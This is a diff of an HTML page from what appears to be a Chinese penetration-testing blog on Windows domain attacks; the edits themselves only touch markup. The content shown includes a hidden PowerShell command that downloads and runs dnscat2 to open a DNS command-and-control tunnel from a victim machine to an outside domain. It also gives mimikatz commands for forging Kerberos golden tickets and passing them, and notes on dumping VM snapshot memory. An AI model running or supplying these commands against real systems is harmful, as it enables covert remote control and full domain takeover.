@@ -295,7 +295,8 @@
 <p>然后客户端（受害机器）进行使用，目前有两种方式</p>
 <ul>
 <li><p>powershell版本的（不推荐</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &#123;IEX(New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#x27;); Start-Dnscat2 -Domain ccc.ascotbe.com -PreSharedSecret 123456&#125;</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &#123;IEX(New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#x27;); Start-Dnscat2 -Domain ccc.ascotbe.com -PreSharedSecret 123456&#125;</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>官方的编译版本，<a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">下载地址</a>   <a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Image/tree/master/Windows">备份地址</a>  解压密码都是<code>password</code></p>
 <p>首先可以看到，机器ping命令是能解析目标IP，但是无法通外网</p>
 <p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/32.png" alt="image-20211202131410776"></p>
@@ -328,7 +329,7 @@
 <li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li>
 <li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li>
 <li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li>
-<li><strong>SS</strong>（Service Server）= 特定服务提供端</li>
+<li><strong>SS</strong>（Service Server）&#x3D; 特定服务提供端</li>
 </ul>
 <p>认证示意图</p>
 <p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/37.png" alt="img"></p>
@@ -347,9 +348,11 @@
 <p>几种利用方式</p>
 <ul>
 <li><p>生成黄金票据，后直接进行ptt连接</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>生成黄金票据，并且保存到文件中后再利用（通过krbtgt的Hash）</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ticket:test.kribi</span><br><span class="line"><span class="comment">#清空票据</span></span><br><span class="line">kerberos::purge</span><br><span class="line"><span class="comment">#导入生成的票据</span></span><br><span class="line">kerberos::ppt test.kribi</span><br><span class="line"><span class="comment">#查看当前会话票据</span></span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ticket:test.kribi</span><br><span class="line"><span class="comment">#清空票据</span></span><br><span class="line">kerberos::purge</span><br><span class="line"><span class="comment">#导入生成的票据</span></span><br><span class="line">kerberos::ppt test.kribi</span><br><span class="line"><span class="comment">#查看当前会话票据</span></span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>生成黄金票据，并且保存到文件中后再利用（通过krbtgt的aes256，上述lsadump中的aes256_hmac值）</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kerberos::gloden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /aes256:&lt;KRBTGT aes256_hmac&gt; /user:&lt;任意用户名&gt; /ticket:test.kribi</span><br><span class="line"><span class="comment">#清空票据</span></span><br><span class="line">kerberos::purge</span><br><span class="line"><span class="comment">#导入生成的票据</span></span><br><span class="line">kerberos::ppt test.kribi</span><br><span class="line"><span class="comment">#查看当前会话票据</span></span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure></li>
 </ul>
@@ -470,7 +473,7 @@
 <p>快照下载需要进去存储中，然后<strong>vmem</strong>和<strong>vmsn</strong>都得下载下来，如下图</p>
 <p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/48.png" alt="image-20211224131729770"></p>
 <p>然后把快照进行内存转储工具<a target="_blank" rel="noopener" href="https://flings.vmware.com/vmss2core">下载</a>，<a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Image/tree/master/Windows">备份地址</a></p>
-<p>如果目标机器使用的是Microsoft Windows 8/8.1、Windows Server 2012、Windows Server 2016 或 Windows Server 2019 的话使用下面命令</p>
+<p>如果目标机器使用的是Microsoft Windows 8&#x2F;8.1、Windows Server 2012、Windows Server 2016 或 Windows Server 2019 的话使用下面命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmss2core.exe -W8 VM-Snapshot1.vmsn VM-Snapshot1.vmem</span><br></pre></td></tr></table></figure>
 
 <p>如果是其他的Windows使用如下命令</p>
